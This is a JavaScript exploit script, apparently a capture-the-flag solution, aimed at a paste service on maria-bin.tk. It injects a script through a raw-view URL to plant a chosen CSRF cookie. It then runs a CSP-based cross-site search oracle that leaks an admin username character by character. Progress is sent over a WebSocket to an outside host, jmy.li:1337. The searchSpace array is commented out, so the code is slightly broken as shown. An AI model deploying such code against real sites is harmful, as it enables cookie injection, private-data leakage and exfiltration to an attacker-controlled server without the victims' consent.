const logSocket = new WebSocket('wss://jmy.li:1337');

logSocket.addEventListener('open', _event => {
        doExploit();
});

const sleep = d => new Promise(r => setTimeout(r, d));

function log(msg){
    if(logSocket.readyState == WebSocket.OPEN){
        logSocket.send(JSON.stringify(msg));
    }
}

async function setCSRF(token) {
    let i = document.createElement('iframe');
    i.src = 'https://raw.maria-bin.tk/view?id=d096620f486f7fe3dcb3419dc8d66d27%3Cscript%3Edocument.cookie=%22%255f%255fHost-csrf=' + token + ';Path=/;Domain=maria-bin.tk%22%3C/script%3E';
    document.body.appendChild(i);
    log('csrf token has been set to ' + token);
}

async function search(name, csrftoken) {
    return new Promise(r => {
        let iframe = document.createElement('iframe');
        let a = document.createElement('a');
        let form = document.createElement('form');
        let timer, calls=0;

        iframe.name = a.target = form.target = 'probe' + Date.now();
        iframe.src = 'https://app.maria-bin.tk/search';
        // If server responds with required CSP it will load, otherwise it will fail to load
        // When there are no results, it matches the CSP A.K.A if fail to load there is a result
        iframe.csp = 'default-src \'none\'';
        a.href = iframe.src + '#';
        // Setup form for post requset
        form.action = 'https://app.maria-bin.tk/search';
        form.method = 'post';
        let options = {'type': 'admin', 'csrf': csrftoken, 'name': name}
        for(const key in options){
            if(options.hasOwnProperty(key)){
                let x = document.createElement('input');
                x.type = 'text';
                x.name = key;
                x.value = options[key];
                form.appendChild(x);
            }
        }

        document.body.appendChild(iframe);
        document.body.appendChild(form);
        document.body.appendChild(a);

        form.submit();

        iframe.onload = function() {
            calls++;
            if(calls > 1){
                // Site did not load, there is a result
                clearTimeout(timer);
                r(true);
                return;
            }
            a.click();
        };

        timer = setTimeout(function(){
            // Site loaded, there are no results
            r(false);
        },1000);
    });
}

async function doExploit() {
    const csrfToken = 'knowntoken';
    await setCSRF(csrfToken);

    await sleep(1000); // sleep to make sure iframes are loaded

    //const searchSpace = 'abcdefghijklmnopqrstuvwxyz-0123456789'.split('');
    // because this exploit is so slow, we can search 2 characters at a time to build up the full leak
    let currentString = 'king-horse-5diuoe7tpxjen8xu0n';
    let continueSearching = true;

    log('searching will now begin');
    while(continueSearching){
        continueSearching = false;
        for(let c of searchSpace) {
            const res = await search(currentString + c, csrfToken);
            if(res){
                currentString += c;
                continueSearching = true;
                log('found user: ' + currentString);
                break;
            }
        }
    }

    log('searching has ended');
}
